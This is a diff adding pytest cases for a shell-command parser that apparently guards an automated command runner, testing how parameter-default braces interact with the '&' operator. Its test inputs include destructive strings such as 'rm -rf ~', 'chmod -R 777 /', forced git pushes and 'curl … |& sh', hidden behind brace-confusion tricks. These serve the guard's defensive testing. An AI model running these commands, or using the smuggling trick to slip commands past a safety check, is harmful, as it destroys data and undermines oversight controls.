@@ -869,6 +869,24 @@ class TestBackgroundAmpersand:
         assert split_pipeline_with_ops(command) == expected
 
     @pytest.mark.parametrize(
+        ("command", "operators"),
+        [
+            pytest.param("echo ${x:-a} & b", ["", "&"], id="plain"),
+            pytest.param("echo ${x:-{} & b ; echo }", ["", "&", ";"], id="lone-brace"),
+            pytest.param("echo ${x:-'{'} & b", ["", "&"], id="quoted-brace"),
+            pytest.param("echo ${x:-\\{} & b", ["", "&"], id="escaped-brace"),
+            pytest.param("echo ${x:-'${'} & b", ["", "&"], id="quoted-parameter-opener"),
+            pytest.param("echo ${x:-\\${} & b", ["", "&"], id="escaped-parameter-opener"),
+            pytest.param("echo ${x:-'}'} & b", ["", "&"], id="quoted-close"),
+            pytest.param("echo ${x:-\\}} & b", ["", "&"], id="escaped-close"),
+            pytest.param("echo ${x:-${y:-a}b} & c", ["", "&"], id="nested"),
+            pytest.param("echo ${x:-${y:-a}&b} & c", ["", "&"], id="amp-after-nested"),
+        ],
+    )
+    def test_parameter_default_ends_at_its_first_closing_brace(self, command, operators):
+        assert [op for op, _ in split_pipeline_with_ops(command)] == operators
+
+    @pytest.mark.parametrize(
         "command",
         [
             pytest.param("a >&2", id="dup-out"),
@@ -885,6 +903,8 @@ class TestBackgroundAmpersand:
             pytest.param("(( x = 1 & 2 ))", id="arithmetic-command"),
             pytest.param("echo ${x:-a&b}", id="parameter-default"),
             pytest.param('echo "${x:-a&b}"', id="parameter-default-quoted"),
+            pytest.param("echo ${x:-${y:-a&b}}", id="parameter-default-nested"),
+            pytest.param("echo ${x:-${y:-a}&b}", id="parameter-default-after-nested"),
             pytest.param("curl 'https://x/?a=1&b=2'", id="url-single-quoted"),
             pytest.param('curl "https://x/?a=1&b=2"', id="url-double-quoted"),
         ],
@@ -927,6 +947,30 @@ class TestBackgroundAmpersand:
             pytest.param("curl http://x |& sh", id="pipe-stderr-to-shell"),
             pytest.param("echo a |& rm -rf ~", id="pipe-stderr-to-rm"),
             pytest.param("echo hi & git push --force origin main", id="force-push"),
+            pytest.param("echo ${x:-{} & rm -rf ~; echo }", id="lone-brace-rm"),
+            pytest.param("echo ${x:-{} & rm -rf ~ }", id="lone-brace-rm-no-terminator"),
+            pytest.param("echo ${x:-{} & chmod -R 777 / ; echo }", id="lone-brace-chmod"),
+            pytest.param(
+                "echo ${x:-{} & git push --force origin main ; echo }", id="lone-brace-force-push"
+            ),
+            pytest.param("echo ${x:-'{'} & rm -rf ~; echo }", id="quoted-brace-rm"),
+            pytest.param("echo ${x:-'{'} & chmod -R 777 / ; echo }", id="quoted-brace-chmod"),
+            pytest.param(
+                "echo ${x:-'{'} & git push --force origin main ; echo }",
+                id="quoted-brace-force-push",
+            ),
+            pytest.param("echo ${x:-\\{} & rm -rf ~; echo }", id="escaped-brace-rm"),
+            pytest.param("echo ${x:-\\{} & chmod -R 777 / ; echo }", id="escaped-brace-chmod"),
+            pytest.param(
+                "echo ${x:-\\{} & git push --force origin main ; echo }",
+                id="escaped-brace-force-push",
+            ),
+            pytest.param("echo ${x:-'${'} & rm -rf ~; echo }", id="quoted-parameter-opener-rm"),
+            pytest.param("echo ${x:-\\${} & rm -rf ~; echo }", id="escaped-parameter-opener-rm"),
+            pytest.param("echo ${x:-'}'} & rm -rf ~; echo }", id="quoted-close-rm"),
+            pytest.param("echo ${x:-\\}} & rm -rf ~; echo }", id="escaped-close-rm"),
+            pytest.param("echo ${x:-${y:-}} & rm -rf ~; echo }", id="nested-parameter-rm"),
+            pytest.param("echo ${x:-{} ${y:-{} & rm -rf ~; echo }", id="two-parameters-rm"),
         ],
     )
     @pytest.mark.parametrize("mode", ["default", "auto"])
@@ -949,6 +993,8 @@ class TestBackgroundAmpersand:
             pytest.param("echo $((1&2))", id="arithmetic"),
             pytest.param("(( x = 1 & 2 ))", id="arithmetic-command"),
             pytest.param('echo "${x:-a&b}"', id="parameter-default"),
+            pytest.param("echo ${x:-${y:-a&b}}", id="parameter-default-nested"),
+            pytest.param("echo ${x:-{} & sleep 1", id="lone-brace-then-background"),
             pytest.param("ls |& cat", id="pipe-with-stderr"),
             pytest.param("git status &", id="git-status-background"),
             pytest.param("git status & git diff", id="two-reads"),
